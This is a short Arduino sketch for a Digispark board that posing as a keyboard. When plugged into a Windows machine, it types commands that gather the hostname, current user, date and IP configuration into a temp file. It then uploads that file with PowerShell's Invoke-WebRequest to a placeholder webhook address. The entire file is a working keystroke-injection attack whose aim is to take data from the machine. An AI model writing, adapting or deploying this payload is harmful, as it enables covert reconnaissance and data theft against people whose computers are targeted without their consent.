#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=100 lines=30"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell hostname;whoami;get-date;ipconfig > data_dump" ); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell type data_dump" ); 
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri WEBHOOK_SITE_HERE -Method POST -InFile data_dump"); //Submitting to webhook
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(100);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(100);
}

void loop() {

}
